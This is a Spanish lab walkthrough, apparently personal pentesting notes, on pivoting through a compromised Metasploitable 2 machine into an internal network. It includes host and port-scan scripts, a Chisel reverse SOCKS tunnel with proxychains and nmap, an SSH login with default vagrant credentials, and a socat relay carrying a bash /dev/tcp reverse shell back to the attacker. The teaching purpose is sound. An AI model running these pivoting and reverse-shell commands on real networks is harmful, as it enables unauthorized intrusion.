Laboratorio:
Máquina Atacante (192.168.1.43)
Máquina Metasploitable 2 (192.168.1.42 / 10.10.10.4)
Máquina Metasploitable 3 (10.10.10.5)

![[Pasted image 20250702213106.png]]

## Escaneo de red interna

Tenemos un Laboratorio donde todas las máquinas son Linux. Como atacante, una vez dentro de la máquina intermediaria (Metasploitable 2), debemos realizar un descubrimiento de hosts en el segmento de red privado de la máquina Metasploitable 2. Para ello, haremos uso de un script en Bash:

```
#!/bin/bash
# Ten en cuenta cambiar el segmento de red segun el caso
for i in $(seq 1 254); do
    ping -c 1 -W 1 10.10.10.$i &>/dev/null && echo "[+] Host 10.10.10.$i - active" &
done; wait
```

Ahora debemos trasladar este script `hostdiscovery.sh` a la máquina Metasploitable 2.
Podemos montar un **servicio http** con **python** en nuestra máquina atacante y acceder al recurso desde la máquina Mt2 con **curl** o **wget**.

```
 sudo python3 -m http.server
```

![[Pasted image 20250702212611.png]]

Ahora desde la máquina Mt2 descargaremos el recurso y le daremos privilegios de ejecución.

```
wget http://192.168.1.43:8000/hostdiscovery.sh
chmod +x hostdiscovery.sh
```

O

```
curl "http://192.168.1.43:8000/hostdiscovery.sh" -o hostdiscovery.sh
chmod +x hostdiscovery.sh
```

![[Pasted image 20250702213245.png]]

![[Pasted image 20250703102646.png]]

vemos dos interfaces de red:
**eth0** -> La que nos conecta con nuestra máquina atacante
**eth1** -> La que conecta la maquina Metassploitable 2 con las demas maquinas de su red interna.
Ahora, ejecutaremos el script para descubrir los distintos hosts conectados a la red interna de la maquina.

![[Pasted image 20250703103015.png]]

Vemos 3 IP's:
10.10.10.4 ---> Metasploitable 2
10.10.10.5 ---> Metasploitable 3 
10.10.10.3 ---> Serv. DHCP vbx

## Escaneo de puertos de la máquina objetivo

Para escanear los puertos, haremos uso del siguiente script `enumports.sh`.

```
#!/bin/bash

function ctrl_c(){
	echo -e "\n\nSaliendo...\n"
	tput cnorm; exit 1
}
#Ctrl + c
trap ctrl_c INT
tput civis

ip="10.10.10.5"  # Dirección IP a escanear

echo "Escaneo de puertos abiertos en curso..."
echo " "

# Realiza un bucle a través de todos los puertos y verifica si están abiertos
for port in $(seq 0 65535); do
    (echo ""  >/dev/tcp/$ip/$port) 2>/dev/null && echo "[+] Puerto $port abierto"
done
```

O, una alternativa:

```
#!/bin/bash

ip="10.10.10.5"
echo "Escaneo rápido de puertos en $ip..."
echo " "

# Función para escanear en paralelo
scan_port() {
    local port=$1
    nc -z -w1 $ip $port 2>/dev/null && echo "[+] Puerto $port abierto"
}

# Exportar función para usar en paralelo
export -f scan_port
export ip

# Escanear en paralelo (máximo 100 procesos simultáneos)
seq 1 65535 | xargs -n 1 -P 100 -I {} bash -c 'scan_port {}'
```

Debemos darle permisos de ejecución.

```
chmod +x enumports.sh
```

![[Pasted image 20250703113429.png]]

Esos son algunos de los puertos que la máquina **Metasploitable 3** tiene abierto. 

## Otra manera de realizar el escaneo de puertos es haciendo uso de [**Chisel**](https://github.com/jpillora/chisel/releases).

![[Pasted image 20250703114518.png]]

Nos traeremos a nuestra máquina atacante el `chisel_1.10.1_linux_amd64.gz` ya que la máquina Metasploitable 2 y nuestra máquina atacante son linux de 64bits. Renombraremos el archivo y lo descomprimiremos.

```
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
mv chisel_1.10.1_linux_amd64.gz chiselx64.gz
gunzip chiselx64.gz
chmod +x chiselx64
```

Ahora, montaremos un **servidor http con python** para trasladar el **chisel** a la máquina Metasploitable 2.

```
 sudo python3 -m http.server 80
```

![[Pasted image 20250703115153.png]]

Ahora, nos descargaremos el chisel en la máquina Metasploitable 2.

```
wget http://192.168.1.43/chiselx64
chmod +x chiselx64
```

O

```
curl "http://192.168.1.43/chiselx64" -o chiselx64
chmod +x chiselx64
```

Una vez hecho esto, tenemos el chisel tanto en la máquina atacante como en la máquina Metasploitable 2.

==**En nuestra máquina atacante**==, tenemos ejecutar chisel como servidor. Debemos indicar un puerto en donde nos pondremos en escucha con chisel.

```
./chiselx64 server --reverse --port 1234
```

![[Pasted image 20250703121900.png]]

Y en la ==**máquina Metasploitable 2**== nos debemos conectar, en modo cliente, a nuestra máquina atacante, por el puerto que le indicamos a chisel. Ahora si queremos traernos un puerto de la máquina **Metasploitable 3**, lo haremos de la siguiente forma.

```
./chiselx64 client 192.168.1.43:1234 R:socks
```

En este caso, entablamos una conexión tipo **socks**, la cual enviará todo el tráfico a nuestra máquina atacante. Y en nuestra máquina atacante veríamos esto.

![[Pasted image 20250703124400.png]]

Vemos que se ha entablado la conexión en el puerto 1080 de nuestra máquina atacante. Ahora debemos modificar el archivo `/etc/proxychains.conf`que se utiliza para redirigir el tráfico de red de cualquier aplicación a través de proxies (incluyendo conexiones SOCKS establecidas con Chisel). Lo haremos de la siguiente forma:

```
# Si Chisel está corriendo un proxy SOCKS en localhost:1080
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
```

¿Para qué sirve modificar proxychains.conf después de establecer un túnel SOCKS con Chisel? Una vez que tienes un túnel SOCKS funcionando con Chisel, necesitas decirle a ProxyChains dónde está ese proxy. 

![[Pasted image 20250703132655.png]]

Ahora haremos un escaneo de puertos y servicios con nmap.

```
proxychains nmap -p- --open -T5 -v -n 10.10.10.5 -sT -Pn 2>&1 | grep -vE "timeout|OK"
```

![[Pasted image 20250703131827.png]]
![[Pasted image 20250703131929.png]]
 Desglose del comando:
 `proxychains`
- Redirige todo el tráfico de nmap a través del proxy SOCKS configurado en `/etc/proxychains.conf`
- Permite hacer el escaneo desde la máquina comprometida hacia el objetivo
`nmap -p- --open -T5 -v -n 10.10.10.5 -sT -Pn`

**Parámetros de escaneo:**
- `-p-`: Escanea **todos los puertos** (1-65535)
- `--open`: Solo muestra puertos **abiertos**
- `-T5`: Velocidad **máxima** (agresivo)
- `-v`: Modo **verbose** (salida detallada)
- `-n`: **No** resolución DNS (más rápido)
- `10.10.10.5`: IP objetivo
- `-sT`: Escaneo TCP **connect()** (requerido para proxies)
- `-Pn`: **No** ping previo (asume que el host está activo)

`2>&1 | grep -vE "timeout|OK"`
**Filtrado de salida:**
- `2>&1`: Redirige **errores** (stderr) a salida estándar (stdout)
- `grep -vE "timeout|OK"`: **Excluye** líneas que contengan "timeout" o "OK"

**¿Qué hace exactamente?**
1. **Escanea todos los puertos TCP** del host 10.10.10.5
2. **A través del proxy SOCKS** (túnel Chisel)
3. **Filtra el ruido** removiendo mensajes de timeout y confirmaciones
4. **Muestra solo información relevante** (puertos abiertos y errores importantes)

==Siempre que queramos hacer peticiones a la máquina Metasploitable 3 debemos usar el comando `proxychains`==
Ahora realizaremos un escaneo de las versiones que corren en esos servicios que nmap nos ha reportado:

```
proxychains nmap -sT -Pn -p21,22,80,139,445 10.10.10.5 
```

![[Pasted image 20250703132447.png]]

Para poder ver el servicio http desde el navegador, hay que configurar un proxy por el puerto 1080 del localhost.

![[Pasted image 20250703140517.png]]

![[Pasted image 20250703140616.png]]

Ahora intentaremos conectarons remotamente por el puerto ssh con las credenciales vagrant:vagrant, de la siguiente manera:

```
proxychains ssh vagrant@10.10.10.5
```

![[Pasted image 20250703140946.png]]

Chisel, crea solamente una conexión unidireccional, por lo tanto, la máquina Metasploitable 3 no puede ver a nuestra máquina atacante, pero si nuestra máquina atacante puede ver la máquina Metasploitable 3. Por lo tanto si quisieramos lanzar un ping desde nuestra máquina atacante a Metasploitable 3, no podríamos. Esto se traduce en que no podremos entablar una shell reversa vía web.
Para poder corregir esto, haremos uso de **`socat`** en la máquina intermedia (Metasploitable 2). Podemos descargarlo desde su repositorio de github [aquí](https://github.com/3ndG4me/socat/releases).

![[Pasted image 20250703142325.png]]

En nuestra ==máquina atacante== nos traeremos el primer binario `socatx64.bin` de la siguiente manera:

```
wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin
chmod +x socatx64.bin
ls
sudo python3 -m http.server 80
```

![[Pasted image 20250703142853.png]]

En la máquina Metasploitable 2, nos traeremos el binario de socat:

```
wget http://192.168.1.43/socatx64.bin
chmod +x socatx64.bin
```

Una vez hecho eso, ejecutamos el siguiente comando para entablar la conexión por **socat**.

```
./socatx64.bin TCP-LISTEN:1111,fork,reuseaddr TCP:192.168.1.43:10000
```

Socat, estará alojado en el puerto 1111 de la máquina Metasploitable 2 y reenviará el tráfico a la máquina atacante (192.168.1.43) al puerto 10000, donde nosotros como atacantes estaremos en escucha con netcat:

```
sudo nc -lvnp 10000
```

Ahora desde la ==máquina Metasploitable 3== intentaremos lanzarnos una reverse shell a la ==máquina Metasploitable 2== por el puerto 1111, que redirigirá el tráfico al puerto 10000 de mi ==máquina atacante==.

```
bash -i >& /dev/tcp/10.10.10.4/1111 0>&1
```

![[Pasted image 20250703144815.png]]

En nuestra ==máquina atacante== hemos recibido la reverse shell.

![[Pasted image 20250703144911.png]]
